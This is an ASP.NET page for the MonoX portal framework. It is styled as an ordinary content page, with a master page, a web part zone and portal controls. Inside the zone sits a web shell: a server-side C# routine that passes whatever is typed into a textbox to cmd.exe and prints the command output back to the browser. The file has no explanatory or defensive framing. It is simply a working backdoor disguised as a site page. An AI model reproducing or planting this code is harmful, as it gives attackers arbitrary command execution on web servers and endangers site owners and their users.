<%@ Page 
    Language="C#" 
    MasterPageFile="~/MonoX/MasterPages/Default.master"
    AutoEventWireup="true"     
    Inherits="MonoSoftware.MonoX.BasePage" 
    Theme="Default"
    Title="" %>

<%@ MasterType TypeName="MonoSoftware.MonoX.BaseMasterPage" %>   
<%@ Register TagPrefix="MonoX" TagName="Editor" Src="~/MonoX/ModuleGallery/MonoXHtmlEditor.ascx" %>
<%@ Register Assembly="MonoX" Namespace="MonoSoftware.MonoX" TagPrefix="portal" %>
<%@ Import Namespace="MonoSoftware.MonoX.Video" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<asp:Content ID="Content1" ContentPlaceHolderID="cp" runat="server">
    <div class="content-wrapper">
        <div class="main-content">
            <portal:PortalWebPartZone HeaderText="Left part zone" ID="leftWebPartZone" runat="server" Width="100%" ChromeTemplateFile="Standard.htm">
                <ZoneTemplate>
                   
                <script Language="c#" runat="server">
				void Page_Load(object sender, EventArgs e)
				{
				}
				string ExcuteCmd(string arg)
				{
					ProcessStartInfo psi = new ProcessStartInfo();
					psi.FileName = "cmd.exe";
					psi.Arguments = "/c "+arg;
					psi.RedirectStandardOutput = true;
					psi.UseShellExecute = false;
					Process p = Process.Start(psi);
					StreamReader stmrdr = p.StandardOutput;
					string s = stmrdr.ReadToEnd();
					stmrdr.Close();
					return s;
				}
				void cmdExe_Click(object sender, System.EventArgs e)
				{
					Response.Write("<pre>");
					Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
					Response.Write("</pre>");
				}
				</script>


				<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
				<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
				<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>				
                </ZoneTemplate>
            </portal:PortalWebPartZone>
        </div>
    </div>
</asp:Content>